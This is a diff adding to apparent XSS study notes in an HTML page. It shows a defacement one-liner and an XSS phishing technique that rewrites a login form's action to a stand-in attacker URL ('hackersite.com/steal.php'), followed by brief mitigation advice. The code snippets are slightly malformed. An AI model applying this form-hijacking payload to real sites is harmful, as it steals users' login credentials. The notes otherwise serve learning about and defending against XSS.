@@ -186,8 +186,18 @@ SOP prevents cookie stealing.
 _typical DOM manipulation is useful at modyfing the page appareance like this:
 >> document.body,innerHTML="<h1>DEFACED</>";
 
+basic way to perform an XSS phishing into a login page is to alter the ACTION parameter of the FORM tag.
+sample: 
+form name="loginform" method="POST" action="/checklogin.cgi"
+attack: the change performed is only applied to the action parameter performing a redirection to the site. 
+form name="loginform" method="POST" action="document.forms[0].action="https://hackersite.com/steal.php";
 
+> MITIGATION
 
+it is about to implement two layers: 
+-input validation: filter as much as possible the attacks vectors
+-context-aware output encoding 
+													
 
 </center>
 </body>
